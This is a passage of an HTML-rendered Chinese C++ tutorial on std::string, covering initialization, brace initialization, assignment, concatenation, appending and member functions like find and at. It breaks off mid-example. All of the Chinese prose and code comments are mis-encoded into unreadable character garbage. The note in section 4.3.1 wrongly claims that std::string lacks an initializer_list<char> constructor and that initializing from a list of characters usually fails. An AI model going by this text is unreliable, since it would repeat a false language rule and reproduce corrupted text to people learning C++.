å¯¹è±¡ä¼šè‡ªåŠ¨å¤„ç†å†…å­˜åˆ†é…å’Œé‡Šæ”¾ã€‚å®ƒå¯ä»¥æ ¹æ®éœ€è¦åŠ¨æ€å¢é•¿æˆ–ç¼©å°ã€‚</li><li>  <strong>æˆå‘˜å‡½æ•°:</strong> <code>string</code> ç±»æä¾›äº†è®¸å¤šå†…ç½®çš„æ“ä½œï¼ˆæˆå‘˜å‡½æ•°ï¼‰ï¼Œå¦‚è·å–é•¿åº¦ã€æ‹¼æ¥ã€æŸ¥æ‰¾ã€æ›¿æ¢ç­‰ï¼Œä½¿å¾—å­—ç¬¦ä¸²å¤„ç†æ›´åŠ å®¹æ˜“ã€‚</li></ul><p><strong>åŸºæœ¬ç”¨æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt; // å¿…é¡»åŒ…å« string å¤´æ–‡ä»¶</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å£°æ˜ string å¯¹è±¡</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s1; <span class="comment">// åˆ›å»ºä¸€ä¸ªç©ºå­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s2 = <span class="string">&quot;Hello&quot;</span>; <span class="comment">// ä½¿ç”¨ C é£æ ¼å­—ç¬¦ä¸²å­—é¢å€¼åˆå§‹åŒ–</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">s3</span><span class="params">(<span class="string">&quot;World&quot;</span>)</span></span>; <span class="comment">// ä½¿ç”¨ C é£æ ¼å­—ç¬¦ä¸²å­—é¢å€¼åˆå§‹åŒ– (æ„é€ å‡½æ•°è¯­æ³•)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s4 = s2; <span class="comment">// ä½¿ç”¨å¦ä¸€ä¸ª string å¯¹è±¡åˆå§‹åŒ– (å¤åˆ¶)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s1: &quot;</span> &lt;&lt; s1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡ºç©ºè¡Œ</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s2: &quot;</span> &lt;&lt; s2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º Hello</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s3: &quot;</span> &lt;&lt; s3 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º World</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s4: &quot;</span> &lt;&lt; s4 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º Hello</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// string å¯¹è±¡å¯ä»¥åƒæ™®é€šå˜é‡ä¸€æ ·ä½¿ç”¨</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> message = s2 + <span class="string">&quot;, &quot;</span> + s3 + <span class="string">&quot;!&quot;</span>; <span class="comment">// å­—ç¬¦ä¸²æ‹¼æ¥</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Message: &quot;</span> &lt;&lt; message &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º Hello, World!</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-3-1-C-11å­—ç¬¦ä¸²åˆå§‹åŒ–"><a href="#4-3-1-C-11å­—ç¬¦ä¸²åˆå§‹åŒ–" class="headerlink" title="4.3.1 C++11å­—ç¬¦ä¸²åˆå§‹åŒ–"></a>4.3.1 C++11å­—ç¬¦ä¸²åˆå§‹åŒ–</h3><p>C++11 å¼•å…¥çš„åˆ—è¡¨åˆå§‹åŒ–ï¼ˆèŠ±æ‹¬å·åˆå§‹åŒ–ï¼‰ä¹Ÿå¯ä»¥ç”¨äº <code>string</code> å¯¹è±¡ï¼Œå…¶è¡Œä¸ºç±»ä¼¼äºä½¿ç”¨ C é£æ ¼å­—ç¬¦ä¸²å­—é¢å€¼è¿›è¡Œåˆå§‹åŒ–ã€‚</p><p><strong>è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> str1 &#123; <span class="string">&quot;Initialized with braces&quot;</span> &#125;; <span class="comment">// ä½¿ç”¨ C é£æ ¼å­—ç¬¦ä¸²å­—é¢å€¼</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> str2 = &#123; <span class="string">&quot;Also works with =&quot;</span> &#125;; </span><br><span class="line"><span class="comment">// std::string str3 &#123; &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27; &#125;; // C++11 ä¸­é€šå¸¸ä¸ç›´æ¥ç”¨å­—ç¬¦åˆ—è¡¨åˆå§‹åŒ– string (ä¼šå°è¯•è°ƒç”¨åŒ¹é…çš„æ„é€ å‡½æ•°)</span></span><br><span class="line"><span class="comment">// std::string str4 = &#123; &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27; &#125;; // åŒä¸Š</span></span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„:</strong> ç›´æ¥ä½¿ç”¨å­—ç¬¦åˆ—è¡¨ <code>&#123; &#39;a&#39;, &#39;b&#39;, &#39;c&#39; &#125;</code> æ¥åˆå§‹åŒ– <code>std::string</code> åœ¨ C++11/14 ä¸­é€šå¸¸ä¸ä¼šæŒ‰é¢„æœŸå·¥ä½œï¼Œå› ä¸ºå®ƒä¼šå°è¯•æŸ¥æ‰¾æ¥å— <code>std::initializer_list&lt;char&gt;</code> çš„æ„é€ å‡½æ•°ï¼Œè€Œæ ‡å‡† <code>std::string</code> æ²¡æœ‰è¿™æ ·çš„æ„é€ å‡½æ•°ã€‚å®ƒé€šå¸¸ä¼šè¢«è§£é‡Šä¸ºå°è¯•è°ƒç”¨æ¥å— C é£æ ¼å­—ç¬¦ä¸² ( <code>const char*</code> ) çš„æ„é€ å‡½æ•°ï¼Œä½†è¿™éœ€è¦åˆ—è¡¨æ°å¥½èƒ½å½¢æˆä¸€ä¸ªæœ‰æ•ˆçš„ C é£æ ¼å­—ç¬¦ä¸²ï¼ˆä¾‹å¦‚ï¼ŒåŒ…å« <code>\0</code>ï¼‰ã€‚</p><p>æœ€å¸¸ç”¨å’Œæ¸…æ™°çš„åˆå§‹åŒ–æ–¹å¼ä»ç„¶æ˜¯ä½¿ç”¨å­—ç¬¦ä¸²å­—é¢å€¼æˆ–å¦ä¸€ä¸ª <code>string</code> å¯¹è±¡ã€‚</p><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> greeting1 &#123; <span class="string">&quot;Good morning&quot;</span> &#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> greeting2 = &#123; <span class="string">&quot;Good afternoon&quot;</span> &#125;;</span><br><span class="line">    <span class="comment">// std::string letters &#123; &#x27;H&#x27;, &#x27;i&#x27;, &#x27;\0&#x27; &#125;; // å¯èƒ½ä¸æŒ‰é¢„æœŸå·¥ä½œæˆ–ç¼–è¯‘é”™è¯¯</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; greeting1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º Good morning</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; greeting2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º Good afternoon</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¨èçš„åˆå§‹åŒ–æ–¹å¼</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s1 = <span class="string">&quot;Hello&quot;</span>;       <span class="comment">// C é£æ ¼å­—é¢å€¼</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">s2</span><span class="params">(<span class="string">&quot;World&quot;</span>)</span></span>;      <span class="comment">// æ„é€ å‡½æ•°è¯­æ³•</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s3 = s1;          <span class="comment">// å¤åˆ¶æ„é€ </span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">s4</span><span class="params">(<span class="number">10</span>, <span class="string">&#x27;c&#x27;</span>)</span></span>;      <span class="comment">// åˆ›å»ºåŒ…å« 10 ä¸ª &#x27;c&#x27; çš„å­—ç¬¦ä¸² &quot;cccccccccc&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s4: &quot;</span> &lt;&lt; s4 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-3-2-èµ‹å€¼ã€æ‹¼æ¥å’Œé™„åŠ "><a href="#4-3-2-èµ‹å€¼ã€æ‹¼æ¥å’Œé™„åŠ " class="headerlink" title="4.3.2 èµ‹å€¼ã€æ‹¼æ¥å’Œé™„åŠ "></a>4.3.2 èµ‹å€¼ã€æ‹¼æ¥å’Œé™„åŠ </h3><p><code>string</code> ç±»é‡è½½äº†å¸¸è§çš„è¿ç®—ç¬¦ï¼Œä½¿å¾—èµ‹å€¼ã€æ‹¼æ¥å’Œé™„åŠ æ“ä½œéå¸¸ç›´è§‚ã€‚</p><ul><li>  <strong>èµ‹å€¼ (<code>=</code>):</strong> å¯ä»¥å°†ä¸€ä¸ª <code>string</code> å¯¹è±¡ã€ä¸€ä¸ª C é£æ ¼å­—ç¬¦ä¸²å­—é¢å€¼æˆ–ä¸€ä¸ª <code>char</code> èµ‹ç»™ä¸€ä¸ª <code>string</code> å¯¹è±¡ã€‚</li><li>  <strong>æ‹¼æ¥ (<code>+</code>):</strong> å¯ä»¥ä½¿ç”¨ <code>+</code> è¿ç®—ç¬¦å°†ä¸¤ä¸ª <code>string</code> å¯¹è±¡ã€<code>string</code> å¯¹è±¡å’Œ C é£æ ¼å­—ç¬¦ä¸²å­—é¢å€¼ã€æˆ–è€… <code>string</code> å¯¹è±¡å’Œ <code>char</code> æ‹¼æ¥èµ·æ¥ï¼Œç”Ÿæˆä¸€ä¸ªæ–°çš„ <code>string</code> å¯¹è±¡ã€‚<strong>æ³¨æ„ï¼šä¸èƒ½ç›´æ¥æ‹¼æ¥ä¸¤ä¸ª C é£æ ¼å­—ç¬¦ä¸²å­—é¢å€¼ï¼Œè‡³å°‘æœ‰ä¸€ä¸ªæ“ä½œæ•°éœ€è¦æ˜¯ <code>string</code> å¯¹è±¡ã€‚</strong></li><li>  <strong>é™„åŠ  (<code>+=</code>):</strong> å¯ä»¥ä½¿ç”¨ <code>+=</code> è¿ç®—ç¬¦å°†ä¸€ä¸ª <code>string</code> å¯¹è±¡ã€ä¸€ä¸ª C é£æ ¼å­—ç¬¦ä¸²å­—é¢å€¼æˆ–ä¸€ä¸ª <code>char</code> é™„åŠ åˆ°ç°æœ‰ <code>string</code> å¯¹è±¡çš„æœ«å°¾ï¼ˆä¿®æ”¹åŸå­—ç¬¦ä¸²ï¼‰ã€‚</li></ul><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s1 = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s2 = <span class="string">&quot;World&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s3;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s4;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// èµ‹å€¼</span></span><br><span class="line">    s3 = s1; <span class="comment">// s3 å˜ä¸º &quot;Hello&quot;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s3 after assignment: &quot;</span> &lt;&lt; s3 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    s3 = <span class="string">&quot;Goodbye&quot;</span>; <span class="comment">// s3 å˜ä¸º &quot;Goodbye&quot;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s3 after new assignment: &quot;</span> &lt;&lt; s3 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    s3 = <span class="string">&#x27;X&#x27;</span>; <span class="comment">// s3 å˜ä¸º &quot;X&quot;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s3 after char assignment: &quot;</span> &lt;&lt; s3 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ‹¼æ¥ (+) - åˆ›å»ºæ–°å­—ç¬¦ä¸²</span></span><br><span class="line">    s4 = s1 + <span class="string">&quot; &quot;</span> + s2 + <span class="string">&quot;!&quot;</span>; <span class="comment">// s4 å˜ä¸º &quot;Hello World!&quot;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s4 (concatenated): &quot;</span> &lt;&lt; s4 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s5 = s1 + <span class="string">&#x27;!&#x27;</span>; <span class="comment">// s5 å˜ä¸º &quot;Hello!&quot;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s5 (string + char): &quot;</span> &lt;&lt; s5 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é”™è¯¯: ä¸èƒ½ç›´æ¥æ‹¼æ¥ä¸¤ä¸ª C é£æ ¼å­—ç¬¦ä¸²å­—é¢å€¼</span></span><br><span class="line">    <span class="comment">// std::string error_str = &quot;String1&quot; + &quot;String2&quot;; // ç¼–è¯‘é”™è¯¯!</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ­£ç¡®: è‡³å°‘æœ‰ä¸€ä¸ªæ˜¯ string å¯¹è±¡</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> ok_str1 = s1 + <span class="string">&quot; String2&quot;</span>; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> ok_str2 = <span class="string">&quot;String1&quot;</span> + s2; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ok_str1: &quot;</span> &lt;&lt; ok_str1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ok_str2: &quot;</span> &lt;&lt; ok_str2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é™„åŠ  (+=) - ä¿®æ”¹åŸå­—ç¬¦ä¸²</span></span><br><span class="line">    s1 += <span class="string">&quot; &quot;</span>; <span class="comment">// s1 å˜ä¸º &quot;Hello &quot;</span></span><br><span class="line">    s1 += s2; <span class="comment">// s1 å˜ä¸º &quot;Hello World&quot;</span></span><br><span class="line">    s1 += <span class="string">&#x27;!&#x27;</span>; <span class="comment">// s1 å˜ä¸º &quot;Hello World!&quot;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s1 after append: &quot;</span> &lt;&lt; s1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-3-3-stringç±»çš„å…¶ä»–æ“ä½œ"><a href="#4-3-3-stringç±»çš„å…¶ä»–æ“ä½œ" class="headerlink" title="4.3.3 stringç±»çš„å…¶ä»–æ“ä½œ"></a>4.3.3 stringç±»çš„å…¶ä»–æ“ä½œ</h3><p><code>string</code> ç±»æä¾›äº†å¤§é‡æˆå‘˜å‡½æ•°æ¥æ‰§è¡Œå„ç§å­—ç¬¦ä¸²æ“ä½œã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„æ“ä½œï¼š</p><ul><li><strong>è·å–é•¿åº¦/å¤§å°:</strong><ul><li>  <code>size()</code> æˆ– <code>length()</code>: è¿”å›å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦æ•°ï¼ˆä¸¤è€…åŠŸèƒ½ç›¸åŒï¼‰ã€‚</li></ul></li><li><strong>æ£€æŸ¥æ˜¯å¦ä¸ºç©º:</strong><ul><li>  <code>empty()</code>: å¦‚æœå­—ç¬¦ä¸²ä¸ºç©ºï¼Œè¿”å› <code>true</code>ï¼Œå¦åˆ™è¿”å› <code>false</code>ã€‚</li></ul></li><li><strong>è®¿é—®å­—ç¬¦:</strong><ul><li>  <code>[]</code> è¿ç®—ç¬¦: åƒæ•°ç»„ä¸€æ ·é€šè¿‡ç´¢å¼•è®¿é—®å­—ç¬¦ï¼ˆä¸è¿›è¡Œè¾¹ç•Œæ£€æŸ¥ï¼‰ã€‚</li><li>  <code>at()</code>: é€šè¿‡ç´¢å¼•è®¿é—®å­—ç¬¦ï¼ˆè¿›è¡Œè¾¹ç•Œæ£€æŸ¥ï¼Œå¦‚æœè¶Šç•Œä¼šæŠ›å‡º <code>std::out_of_range</code> å¼‚å¸¸ï¼‰ã€‚</li></ul></li><li><strong>æŸ¥æ‰¾:</strong><ul><li>  <code>find()</code>: æŸ¥æ‰¾å­å­—ç¬¦ä¸²æˆ–å­—ç¬¦é¦–æ¬¡å‡ºç°çš„ä½ç½®ï¼Œè¿”å›ç´¢å¼•ï¼›å¦‚æœæœªæ‰¾åˆ°ï¼Œè¿”å› <code>std::string::npos</code> (ä¸€ä¸ªç‰¹æ®Šçš„é™æ€æˆå‘˜å¸¸é‡)ã€‚</li><li>  <code>rfind()</code>: ä»åå‘å‰æŸ¥æ‰¾ã€‚</li><li>  <code>find_first_of()</code>, <code>find_last_of()</code>, <code>find_first_not_of()</code>, <code>find_last_not_of()</code>: æŸ¥æ‰¾å­—ç¬¦é›†ä¸­çš„ä»»æ„å­—ç¬¦æˆ–éä»»æ„å­—ç¬¦ã€‚</li></ul></li><li><strong>å­å­—ç¬¦ä¸²:</strong><ul><li>  <code>substr(pos, count)</code>: è¿”å›ä»ä½ç½® <code>pos</code> å¼€å§‹ï¼Œé•¿åº¦ä¸º <code>count</code> çš„å­å­—ç¬¦ä¸²ã€‚</li></ul></li><li><strong>æ¯”è¾ƒ:</strong><ul><li>  <code>compare()</code>: æ¯”è¾ƒå­—ç¬¦ä¸²ï¼ˆå­—å…¸åºï¼‰ï¼Œè¿”å›è´Ÿæ•°ã€é›¶æˆ–æ­£æ•°ã€‚</li><li>  é‡è½½çš„å…³ç³»è¿ç®—ç¬¦ (<code>==</code>, <code>!=</code>, <code>&lt;</code>, <code>&gt;</code>, <code>&lt;=</code>, <code>&gt;=</code>): å¯ä»¥ç›´æ¥æ¯”è¾ƒ <code>string</code> å¯¹è±¡ã€‚</li></ul></li><li><strong>ä¿®æ”¹:</strong><ul><li>  <code>insert()</code>: åœ¨æŒ‡å®šä½ç½®æ’å…¥å­—ç¬¦æˆ–å­—ç¬¦ä¸²ã€‚</li><li>  <code>erase()</code>: åˆ é™¤æŒ‡å®šä½ç½®å’Œæ•°é‡çš„å­—ç¬¦ã€‚</li><li>  <code>replace()</code>: æ›¿æ¢æŒ‡å®šèŒƒå›´çš„å­—ç¬¦ã€‚</li><li>  <code>clear()</code>: æ¸…ç©ºå­—ç¬¦ä¸²ã€‚</li><li>  <code>append()</code>: ç­‰åŒäº <code>+=</code>ã€‚</li></ul></li></ul><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdexcept&gt; // ä¸ºäº† std::out_of_range</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> text = <span class="string">&quot;Hello C++ World!&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é•¿åº¦å’Œç©ºæ£€æŸ¥</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Text: \&quot;&quot;</span> &lt;&lt; text &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Length: &quot;</span> &lt;&lt; text.length() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 16</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Is empty? &quot;</span> &lt;&lt; <span class="built_in">std</span>::boolalpha &lt;&lt; text.empty() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º false</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¿é—®å­—ç¬¦</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First char (operator[]): &quot;</span> &lt;&lt; text[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;   <span class="comment">// è¾“å‡º H</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Fifth char (at()): &quot;</span> &lt;&lt; text.at(<span class="number">4</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;     <span class="comment">// è¾“å‡º o</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; text.at(20); // ä¼šæŠ›å‡º std::out_of_range å¼‚å¸¸</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æŸ¥æ‰¾</span></span><br><span class="line">    <span class="keyword">size_t</span> pos_cpp = text.find(<span class="string">&quot;C++&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pos_cpp != <span class="built_in">std</span>::<span class="built_in">string</span>::npos) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\&quot;C++\&quot; found at index: &quot;</span> &lt;&lt; pos_cpp &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 6</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\&quot;C++\&quot; not found.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">size_t</span> pos_l = text.find(<span class="string">&#x27;l&#x27;</span>); <span class="comment">// æŸ¥æ‰¾ç¬¬ä¸€ä¸ª &#x27;l&#x27;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First &#x27;l&#x27; found at index: &quot;</span> &lt;&lt; pos_l &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> pos_last_l = text.rfind(<span class="string">&#x27;l&#x27;</span>); <span class="comment">// æŸ¥æ‰¾æœ€åä¸€ä¸ª &#x27;l&#x27;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Last &#x27;l&#x27; found at 